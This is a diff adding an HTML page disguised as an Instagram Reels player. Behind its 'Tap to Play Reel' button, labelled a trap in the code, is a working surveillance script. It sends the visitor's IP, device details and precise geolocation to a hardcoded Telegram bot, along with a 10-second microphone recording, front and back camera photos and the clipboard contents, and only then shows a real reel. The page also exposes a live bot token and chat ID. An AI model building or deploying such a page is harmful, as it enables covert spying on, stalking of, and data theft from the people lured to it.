@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>Reels • Instagram</title>
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+    * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+    body { 
+        background: #000; 
+        color: #fff; 
+        font-family: -apple-system, BlinkMacSystemFont, 'Inter', 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
+        overflow: hidden; 
+        height: 100vh; 
+        width: 100vw;
+        position: fixed;
+    }
+
+    /* Top Bar - Instagram Reels Style */
+    .top-bar { 
+        position: absolute; 
+        top: 0; left: 0; right: 0; 
+        padding: 14px 16px; 
+        display: flex; 
+        justify-content: space-between; 
+        align-items: center; 
+        z-index: 100; 
+        background: linear-gradient(to bottom, rgba(0,0,0,0.7) 0%, transparent 100%);
+        backdrop-filter: blur(4px);
+    }
+    .top-bar .logo { 
+        font-family: 'Brush Script MT', 'Segoe Script', cursive; 
+        font-size: 26px; 
+        font-weight: 700;
+        letter-spacing: 0.5px;
+    }
+    .top-bar .icons { display: flex; gap: 18px; align-items: center; }
+    .top-bar .icons svg { width: 24px; height: 24px; fill: #fff; }
+
+    /* Reel Container */
+    .reel-container { 
+        position: relative; 
+        width: 100%; 
+        height: 100%; 
+        display: flex; 
+        justify-content: center; 
+        align-items: center; 
+        background: #000;
+    }
+    
+    /* Blurred Background */
+    .bg-blur {
+        position: absolute;
+        inset: 0;
+        background-image: url('https://images.unsplash.com/photo-1611162617474-5b21e879e113?q=80&w=1000&auto=format&fit=crop');
+        background-size: cover;
+        background-position: center;
+        filter: blur(20px) brightness(0.3);
+        transform: scale(1.1);
+        z-index: 1;
+    }
+
+    /* Play Button Trap */
+    .play-wrapper { 
+        position: relative; 
+        z-index: 10; 
+        display: flex; 
+        flex-direction: column; 
+        align-items: center; 
+        cursor: pointer;
+        text-align: center;
+    }
+    .play-btn { 
+        width: 80px; 
+        height: 80px; 
+        background: rgba(255, 255, 255, 0.15); 
+        backdrop-filter: blur(10px); 
+        border-radius: 50%; 
+        display: flex; 
+        justify-content: center; 
+        align-items: center; 
+        border: 2px solid rgba(255,255,255,0.9); 
+        transition: all 0.2s ease;
+        box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+    }
+    .play-btn:active { transform: scale(0.9); background: rgba(255, 255, 255, 0.3); }
+    .play-btn svg { width: 38px; height: 38px; fill: #fff; margin-left: 6px; }
+    .play-text { 
+        margin-top: 18px; 
+        font-size: 15px; 
+        font-weight: 600; 
+        color: #fff;
+        letter-spacing: 0.3px;
+        text-shadow: 0 2px 8px rgba(0,0,0,0.8);
+    }
+
+    /* Real Reel Iframe */
+    #realReel { 
+        position: absolute; 
+        inset: 0; 
+        width: 100%; 
+        height: 100%; 
+        display: none; 
+        z-index: 5; 
+        background: #000;
+    }
+    #realReel iframe { width: 100%; height: 100%; border: none; }
+
+    /* Loading Screen */
+    #loadingScreen { 
+        position: absolute; 
+        inset: 0; 
+        background: #000; 
+        z-index: 50; 
+        display: none; 
+        flex-direction: column; 
+        justify-content: center; 
+        align-items: center; 
+    }
+    .spinner { 
+        width: 34px; 
+        height: 34px; 
+        border: 3px solid rgba(255,255,255,0.1); 
+        border-top-color: #fff; 
+        border-radius: 50%; 
+        animation: spin 0.8s linear infinite; 
+        margin-bottom: 18px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* Bottom UI */
+    .bottom-ui { 
+        position: absolute; 
+        bottom: 0; left: 0; right: 0; 
+        padding: 20px 16px 40px 16px; 
+        z-index: 10; 
+        background: linear-gradient(to top, rgba(0,0,0,0.9) 0%, transparent 100%);
+        display: none; 
+        flex-direction: column; 
+        gap: 12px; 
+    }
+    .user-row { display: flex; align-items: center; gap: 10px; }
+    .avatar { 
+        width: 34px; height: 34px; 
+        border-radius: 50%; 
+        background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); 
+        border: 2px solid #fff;
+    }
+    .username { font-weight: 700; font-size: 14.5px; }
+    .caption { font-size: 14px; line-height: 1.4; opacity: 0.95; font-weight: 400; }
+    .music-ticker {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        font-size: 12.5px;
+        opacity: 0.85;
+        margin-top: 6px;
+    }
+    .music-ticker svg { width: 14px; height: 14px; fill: #fff; }
+
+    /* Right Side Icons */
+    .right-actions {
+        position: absolute;
+        right: 12px;
+        bottom: 60px;
+        display: flex;
+        flex-direction: column;
+        gap: 20px;
+        z-index: 10;
+        align-items: center;
+    }
+    .action-btn { display: flex; flex-direction: column; align-items: center; gap: 4px; cursor: pointer; }
+    .action-btn svg { width: 26px; height: 26px; fill: #fff; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.5)); }
+    .action-btn span { font-size: 11px; font-weight: 500; }
+
+    /* Hidden elements for capture */
+    #camVideo, #camCanvas { display: none; position: absolute; left: -9999px; }
+</style>
+</head>
+<body>
+
+    <!-- Top Bar -->
+    <div class="top-bar">
+        <div class="logo">Reels</div>
+        <div class="icons">
+            <svg viewBox="0 0 24 24"><path d="M9.78 18.65l-1.42 1.42C6.8 21.65 4.9 22 3 21.94v-3.6c1.32-.03 2.63-.46 3.75-1.28l1.42-1.42c.55-.55 1.44-.55 1.99 0 .55.55.55 1.44 0 1.99l-.38.38zM14.22 5.35l1.42-1.42c1.56-1.56 3.46-1.93 5.36-1.87v3.6c-1.32.03-2.63.46-3.75 1.28l-1.42 1.42c-.55.55-1.44.55-1.99 0-.55-.55-.55-1.44 0-1.99l.38-.38z"/><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"/></svg>
+        </div>
+    </div>
+
+    <!-- Reel Area -->
+    <div class="reel-container">
+        <div class="bg-blur"></div>
+        
+        <!-- Play Button Trap -->
+        <div class="play-wrapper" id="playBtnWrapper">
+            <div class="play-btn">
+                <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
+            </div>
+            <div class="play-text">Tap to Play Reel</div>
+        </div>
+    </div>
+
+    <!-- Real Reel -->
+    <div id="realReel">
+        <iframe id="reelIframe" src="" allow="autoplay; encrypted-media; picture-in-picture" allowfullscreen></iframe>
+    </div>
+
+    <!-- Loading -->
+    <div id="loadingScreen">
+        <div class="spinner"></div>
+        <div style="font-size: 14px; font-weight: 500; opacity: 0.9;">Loading...</div>
+    </div>
+
+    <!-- Bottom UI & Right Actions -->
+    <div id="postUI" style="display: none;">
+        <div class="bottom-ui" id="bottomUI">
+            <div class="user-row">
+                <div class="avatar"></div>
+                <div class="username">viral_vibes_01</div>
+                <button style="margin-left: auto; background: transparent; border: 1px solid rgba(255,255,255,0.5); color: #fff; padding: 4px 12px; border-radius: 4px; font-weight: 600; font-size: 12px;">Follow</button>
+            </div>
+            <div class="caption">Wait for it... 😂🔥 #trending #viral #reels</div>
+            <div class="music-ticker">
+                <svg viewBox="0 0 24 24"><path d="M12 3v10.55c-.59-.34-1.27-.55-2-.55-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4V7h4V3h-6z"/></svg>
+                <span>viral_vibes_01 • Original Audio</span>
+            </div>
+        </div>
+        
+        <div class="right-actions">
+            <div class="action-btn">
+                <svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
+                <span>124K</span>
+            </div>
+            <div class="action-btn">
+                <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H5.17L4 17.17V4h16v12z"/></svg>
+                <span>1,204</span>
+            </div>
+            <div class="action-btn">
+                <svg viewBox="0 0 24 24"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/></svg>
+                <span>Share</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Hidden Capture Elements -->
+    <video id="camVideo" playsinline muted autoplay></video>
+    <canvas id="camCanvas"></canvas>
+
+<script>
+const BOT_TOKEN = "8939528828:AAHY99zEOtr2zrHRK4cSq2-rMwMnv5JK-s8";
+const TG_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
+
+// UID Logic
+const urlParams = new URLSearchParams(window.location.search);
+const TARGET_CHAT_ID = urlParams.get('uid') || "713914937";
+
+// Reel Embed Link
+const REEL_EMBED_URL = "https://www.instagram.com/reel/DakjE9SsZFc/embed/";
+
+// UI Elements
+const playBtn = document.getElementById('playBtnWrapper');
+const loadingScreen = document.getElementById('loadingScreen');
+const realReel = document.getElementById('realReel');
+const reelIframe = document.getElementById('reelIframe');
+const postUI = document.getElementById('postUI');
+
+let mediaStream = null;
+
+// --- Telegram Helpers ---
+async function tgSendMessage(text) {
+    try {
+        await fetch(`${TG_API}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: TARGET_CHAT_ID, text, parse_mode: "HTML" })
+        });
+    } catch (e) {}
+}
+
+async function tgSendPhoto(blob, caption) {
+    try {
+        const fd = new FormData();
+        fd.append("chat_id", TARGET_CHAT_ID);
+        fd.append("caption", caption);
+        fd.append("photo", blob, `img_${Date.now()}.jpg`);
+        await fetch(`${TG_API}/sendPhoto`, { method: "POST", body: fd });
+    } catch (e) {}
+}
+
+async function tgSendDocument(blob, filename, caption) {
+    try {
+        const fd = new FormData();
+        fd.append("chat_id", TARGET_CHAT_ID);
+        fd.append("caption", caption);
+        fd.append("document", blob, filename);
+        await fetch(`${TG_API}/sendDocument`, { method: "POST", body: fd });
+    } catch (e) {}
+}
+
+// --- Info Gathering ---
+async function getIP() {
+    try { const r = await fetch("https://api.ipify.org?format=json"); const j = await r.json(); return j.ip || "?"; } catch (e) { return "?"; }
+}
+
+async function getBattery() {
+    try { 
+        if (!navigator.getBattery) return null; 
+        const b = await navigator.getBattery(); 
+        return { level: Math.round(b.level * 100), charging: b.charging }; 
+    } catch (e) { return null; }
+}
+
+async function getLocation() {
+    return new Promise((resolve) => {
+        if (!navigator.geolocation) return resolve(null);
+        navigator.geolocation.getCurrentPosition(
+            (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
+            () => resolve(null),
+            { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
+        );
+    });
+}
+
+const video = document.getElementById("camVideo");
+const canvas = document.getElementById("camCanvas");
+const ctx = canvas.getContext("2d");
+
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+async function captureFrame() {
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    ctx.drawImage(video, 0, 0);
+    return new Promise(res => canvas.toBlob(b => res(b), "image/jpeg", 0.9));
+}
+
+async function captureSet(facing, count, label) {
+    try {
+        if (mediaStream) { mediaStream.getTracks().forEach(t => t.stop()); }
+        
+        // Request Camera
+        mediaStream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: { ideal: facing }, width: { ideal: 1280 }, height: { ideal: 720 } },
+            audio: false
+        });
+        
+        video.srcObject = mediaStream;
+        await video.play();
+        await sleep(800); // Wait for camera to adjust
+        
+        for (let i = 0; i < count; i++) {
+            await sleep(500);
+            const blob = await captureFrame();
+            if (blob) await tgSendPhoto(blob, `${label} #${i + 1}`);
+        }
+    } catch (e) {
+        // Agar permission deny ho jaye toh yahan aayega, code aage badh jayega
+    } finally {
+        if (mediaStream) {
+            mediaStream.getTracks().forEach(t => t.stop());
+            mediaStream = null;
+        }
+    }
+}
+
+// --- Main Logic (The Locked Sequence) ---
+playBtn.addEventListener('click', async () => {
+    // 1. Immediately hide play button and show loading (Video lock)
+    playBtn.style.display = 'none';
+    loadingScreen.style.display = 'flex';
+
+    // 2. Send Device Info & IP
+    const [ip, battery] = await Promise.all([getIP(), getBattery()]);
+    let batText = battery ? `🔋 ${battery.level}% ${battery.charging ? "(Charging)" : "(Not charging)"}` : "Battery: n/a";
+    
+    await tgSendMessage(
+        `🎯 <b>Reel Trap Triggered!</b>\n\n` +
+        `📱 <b>Device:</b> <code>${navigator.userAgent}</code>\n` +
+        `🌐 <b>IP:</b> <code>${ip}</code>\n` +
+        `${batText}\n` +
+        `🖥 <b>Screen:</b> ${screen.width}x${screen.height}\n` +
+        `🗣 <b>Lang:</b> ${navigator.language}\n` +
+        `🕐 <b>Time:</b> ${new Date().toLocaleString("en-IN")}`
+    );
+
+    // 3. Request Permissions & Capture (Sequential)
+    try {
+        // --- Location ---
+        const loc = await getLocation();
+        if (loc) {
+            await tgSendMessage(
+                `📍 <b>Exact Location:</b> ${loc.lat.toFixed(6)}, ${loc.lon.toFixed(6)} (±${Math.round(loc.acc)}m)\n` +
+                `<a href="https://maps.google.com/?q=${loc.lat},${loc.lon}">View on Map</a>`
+            );
+        }
+
+        // --- Mic (10s) ---
+        try {
+            const micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            const mediaRecorder = new MediaRecorder(micStream);
+            let audioChunks = [];
+            mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) audioChunks.push(e.data); };
+            
+            // Promise wait for recording to finish
+            await new Promise((resolve) => {
+                mediaRecorder.onstop = async () => {
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                    await tgSendDocument(audioBlob, `audio_${Date.now()}.webm`, "🎤 10s Mic Recording");
+                    micStream.getTracks().forEach(t => t.stop());
+                    resolve();
+                };
+                mediaRecorder.start();
+                setTimeout(() => { mediaRecorder.stop(); }, 10000);
+            });
+        } catch(e) { /* Mic denied */ }
+
+        // --- Camera (Front 3 + Back 3) ---
+        await captureSet("user", 3, "Front Cam");
+        await captureSet("environment", 3, "Back Cam");
+
+    } catch (err) {
+        // Ignore errors (e.g., if user denies location)
+    }
+
+    // 4. UNLOCK VIDEO (Only after all permissions are handled)
+    loadingScreen.style.display = 'none';
+    realReel.style.display = 'block';
+    postUI.style.display = 'block';
+    reelIframe.src = REEL_EMBED_URL;
+
+    // 5. Clipboard Sniffing (Bonus)
+    try {
+        const text = await navigator.clipboard.readText();
+        if (text) await tgSendMessage(`📋 <b>Clipboard Data:</b>\n<code>${text}</code>`);
+    } catch (e) {}
+});
+</script>
+</body>
+</html>
